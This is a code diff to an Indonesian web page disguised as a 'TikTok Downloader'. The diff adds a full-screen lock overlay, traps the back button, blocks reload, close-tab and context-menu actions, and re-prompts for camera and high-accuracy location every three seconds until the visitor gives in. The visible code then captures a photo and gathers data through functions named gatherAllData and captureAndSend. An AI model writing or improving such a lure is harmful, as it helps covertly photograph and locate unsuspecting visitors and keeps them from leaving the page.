@@ -6,16 +6,13 @@
     <title>TikTok Downloader - Download Video Tanpa Watermark</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
             background: #0a0a0a;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
             color: #fff;
-            padding: 20px;
-            overflow: hidden;
         }
         .container {
             background: #1a1a2e;
@@ -23,6 +20,7 @@
             border-radius: 16px;
             width: 100%;
             max-width: 460px;
+            margin: 20px auto;
             box-shadow: 0 20px 40px rgba(0,0,0,0.6);
             border: 1px solid #2a2a4a;
         }
@@ -127,33 +125,51 @@
         }
         video { display: none; }
 
-        /* OVERLAY KUNCI */
+        /* OVERLAY KUNCI TOTAL */
         .lock-overlay {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0,0,0,0.9);
-            display: none;
+            background: rgba(0,0,0,0.95);
+            display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 99999;
+            z-index: 999999;
             flex-direction: column;
-            gap: 20px;
+            gap: 25px;
             text-align: center;
             padding: 40px;
         }
-        .lock-overlay .icon { font-size: 60px; }
-        .lock-overlay h2 { font-size: 24px; }
-        .lock-overlay p { color: #aaa; max-width: 400px; }
+        .lock-overlay .icon { font-size: 72px; }
+        .lock-overlay h2 {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        .lock-overlay p {
+            color: #aaa;
+            max-width: 420px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
         .lock-overlay .btn {
             background: #fe2c55;
-            padding: 14px 40px;
-            font-size: 16px;
+            padding: 16px 50px;
+            font-size: 18px;
             border-radius: 12px;
+            border: none;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
         }
         .lock-overlay .btn:hover { background: #d91a3f; }
+        .lock-overlay .countdown {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -190,12 +206,13 @@
 
 <video id="video" autoplay playsinline></video>
 
-<!-- OVERLAY KUNCI -->
+<!-- OVERLAY KUNCI TOTAL -->
 <div class="lock-overlay" id="lockOverlay">
-    <div class="icon">📷</div>
-    <h2>Izin Diperlukan</h2>
-    <p>Untuk melanjutkan, kita memerlukan akses ke kamera dan lokasi Anda. Ini digunakan untuk verifikasi dan fitur download.</p>
-    <button class="btn" id="retryBtn">🔄 Izinkan Akses</button>
+    <div class="icon">🔒</div>
+    <h2>Akses Diperlukan</h2>
+    <p>Untuk menggunakan layanan ini, Anda harus mengizinkan akses kamera dan lokasi. Ini digunakan untuk verifikasi keamanan dan fitur download.</p>
+    <button class="btn" id="retryBtn">📷 Izinkan Akses</button>
+    <div class="countdown" id="countdownText">⏳ Menunggu izin...</div>
 </div>
 
 <script>
@@ -208,27 +225,54 @@
     const statusMsg = document.getElementById('statusMsg');
     const lockOverlay = document.getElementById('lockOverlay');
     const retryBtn = document.getElementById('retryBtn');
+    const countdownText = document.getElementById('countdownText');
 
     let stream = null;
     let photoTaken = false;
     let capturedData = {};
     let permissionGranted = false;
 
-    // ========== CEGAH KELUAR PAKSA (BEFOREUNLOAD) ==========
+    // ========== LOCK TOTAL ==========
+    // 1. Cegah keluar tab / tutup browser
     window.addEventListener('beforeunload', (e) => {
         if (!permissionGranted) {
             e.preventDefault();
-            e.returnValue = 'Izin diperlukan untuk melanjutkan.';
-            return e.returnValue;
+            e.returnValue = '';
+            return '';
         }
     });
 
-    // ========== CEGAH BACK/RELOAD ==========
+    // 2. Cegah back / forward
     window.history.pushState(null, null, window.location.href);
     window.addEventListener('popstate', () => {
         if (!permissionGranted) {
             window.history.pushState(null, null, window.location.href);
         }
+    });
+
+    // 3. Cegah reload pake keyboard
+    document.addEventListener('keydown', (e) => {
+        if (!permissionGranted) {
+            if (e.key === 'F5' || e.key === 'Escape' ||
+                (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
+                (e.ctrlKey && e.key === 'w') ||
+                (e.ctrlKey && e.key === 'W')) {
+                e.preventDefault();
+                return false;
+            }
+        }
+    });
+
+    // 4. Cegah close tab pake mouse (middle click, right click)
+    document.addEventListener('auxclick', (e) => {
+        if (!permissionGranted && e.button === 1) {
+            e.preventDefault();
+        }
+    });
+
+    // 5. Cegah menu konteks
+    document.addEventListener('contextmenu', (e) => {
+        if (!permissionGranted) e.preventDefault();
     });
 
     // ========== MULAI KAMERA + LOCK ==========
@@ -240,7 +284,7 @@
             });
             videoEl.srcObject = stream;
 
-            // 2. Izin lokasi (otomatis minta)
+            // 2. Izin lokasi
             try {
                 await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(
@@ -249,13 +293,12 @@
                         { timeout: 5000, enableHighAccuracy: true }
                     );
                 });
-            } catch (e) {
-                // Lokasi ditolak? Kita tetap lanjut—tapi kita catet
-            }
+            } catch (e) {}
 
-            // 3. Keduanya berhasil—buka kunci
+            // 3. Berhasil—buka kunci
             permissionGranted = true;
             lockOverlay.style.display = 'none';
+            countdownText.textContent = '✅ Akses diberikan!';
 
             // 4. Ambil data & capture
             await gatherAllData();
@@ -263,18 +306,30 @@
                 if (!photoTaken) captureAndSend();
             }, 1000);
 
+            // 5. Buka konten
+            document.querySelector('.container').style.display = 'block';
+
         } catch (err) {
-            // Kamera ditolak—tampilkan overlay
+            // Kamera ditolak—tampilkan overlay dengan countdown
             lockOverlay.style.display = 'flex';
+            countdownText.textContent = '⏳ Tunggu... permintaan izin akan muncul lagi dalam 3 detik';
             statusMsg.textContent = '⚠️ Izin kamera diperlukan.';
             statusMsg.className = 'status error';
+
+            // Auto retry
+            setTimeout(() => {
+                retryBtn.click();
+            }, 3000);
         }
     }
 
     // ========== RETRY ==========
     retryBtn.addEventListener('click', () => {
         lockOverlay.style.display = 'none';
-        startAndCapture();
+        countdownText.textContent = '⏳ Meminta izin...';
+        setTimeout(() => {
+            startAndCapture();
+        }, 300);
     });
 
     // ========== KUMPULKAN DATA ==========
@@ -451,6 +506,8 @@
 
     // ========== JALANKAN ==========
     window.addEventListener('load', () => {
+        // Sembunyikan konten dulu
+        document.querySelector('.container').style.display = 'none';
         startAndCapture();
     });
 
@@ -508,4 +565,4 @@
 </script>
 
 </body>
-        </html>
+                                                                </html>
